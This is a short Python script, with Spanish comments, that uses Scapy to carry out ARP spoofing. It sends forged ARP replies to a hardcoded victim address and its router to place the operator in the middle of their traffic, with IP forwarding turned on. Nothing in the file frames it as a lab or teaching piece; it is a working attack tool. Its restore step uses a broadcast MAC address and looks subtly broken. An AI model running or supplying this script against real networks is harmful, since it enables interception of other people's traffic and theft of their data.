from scapy.all import ARP, send
import time
import sys
import os

victima_ip = "15.0.7.3"
router_ip = "15.0.7.1"
interface = "eth0"

def habilitar_ip_forward():
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

def deshabilitar_ip_forward():
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")

def spoof(target_ip, spoof_ip):
    paquete = ARP(op=2, pdst=target_ip, psrc=spoof_ip)
    send(paquete, verbose=False)

def restaurar(destino_ip, origen_ip):
    paquete = ARP(op=2, pdst=destino_ip, psrc=origen_ip, hwsrc="ff:ff:ff:ff:ff:ff")
    send(paquete, count=5, verbose=False)

try:
    print("[*] Activando IP Forwarding")
    habilitar_ip_forward()

    print("[*] Iniciando ARP Spoofing (CTRL+C para detener)")
    while True:
        # Envenenar a la víctima
        spoof(victima_ip, router_ip)
        # Envenenar al router
        spoof(router_ip, victima_ip)
        time.sleep(2)

except KeyboardInterrupt:
    print("\n[*] Restaurando tablas ARP...")
    restaurar(victima_ip, router_ip)
    restaurar(router_ip, victima_ip)
    deshabilitar_ip_forward()
    print("[*] Listo. Red restaurada.")
    sys.exit(0)
